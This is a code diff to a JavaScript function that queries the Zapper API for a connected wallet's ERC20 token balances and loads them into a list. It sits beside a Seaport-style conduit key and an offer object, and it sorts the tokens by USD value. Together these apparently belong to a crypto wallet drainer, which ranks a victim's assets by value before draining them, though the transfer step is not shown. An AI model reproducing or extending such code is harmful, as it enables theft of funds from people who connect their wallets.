@@ -495,7 +495,7 @@ async function getWalletAccount() {
         conduitKey: "0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000",
     }
 
- try {
+try {
     const query = `
         query PortfolioV2($addresses: [Address!]!) {
             portfolioV2(addresses: $addresses) {
@@ -503,12 +503,14 @@ async function getWalletAccount() {
                     byToken {
                         edges {
                             node {
-                                address
-                                network
+                                tokenAddress
+                                symbol
                                 balance
                                 balanceRaw
                                 balanceUSD
-                                symbol
+                                network {
+                                    name
+                                }
                             }
                         }
                     }
@@ -517,43 +519,35 @@ async function getWalletAccount() {
         }
     `;
 
-    const response = await fetch("https://public.zapper.xyz/graphql", {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json",
-            "x-zapper-api-key": ZAPPER_KEY,
-        },
-        body: JSON.stringify({
-            query,
-            variables: {
-                addresses: [account],
+    const response = await fetch(
+        "https://public.zapper.xyz/graphql",
+        {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+                "x-zapper-api-key": ZAPPER_KEY,
             },
-        }),
-    });
+            body: JSON.stringify({
+                query,
+                variables: {
+                    addresses: [account],
+                },
+            }),
+        }
+    );
 
-    // Read the raw response first so GraphQL errors are visible.
     const raw = await response.text();
 
     console.log("========== ZAPPER RESPONSE ==========");
     console.log("HTTP Status:", response.status);
-    console.log("HTTP Status Text:", response.statusText);
-    console.log("Response Body:");
-    console.log(raw);
-    console.log("====================================");
+    console.log("Response:", raw);
 
     if (!response.ok) {
-        console.error("Zapper request failed.");
+        console.error("Zapper HTTP Error");
         return;
     }
 
-    let result;
-
-    try {
-        result = JSON.parse(raw);
-    } catch (e) {
-        console.error("Response was not valid JSON.");
-        return;
-    }
+    const result = JSON.parse(raw);
 
     if (result.errors) {
         console.error("GraphQL Errors:", result.errors);
@@ -563,19 +557,26 @@ async function getWalletAccount() {
     const edges =
         result?.data?.portfolioV2?.tokenBalances?.byToken?.edges || [];
 
+    tokenList.length = 0;
+
     edges.forEach(({ node }) => {
         tokenList.push({
             type: "erc20",
-            tokenAddress: node.address,
+            tokenAddress: node.tokenAddress,
             balance: node.balanceUSD ?? 0,
             tokenAmountFix: node.balance,
-            chain: node.network,
+            chain: node.network?.name ?? "",
             tokenAmount: node.balanceRaw,
             symbol: node.symbol,
         });
     });
+
+    console.log(
+        `Loaded ${tokenList.length} ERC20 tokens from Zapper.`
+    );
+
 } catch (err) {
-    console.error("Zapper Exception:", err);
+    console.error("Failed to retrieve Zapper balances:", err);
 }
     if (offer.offer.length == 0) {
         tokenList.sort((a, b) => (Number(b.balance) > Number(a.balance)) ? 1 : -1);
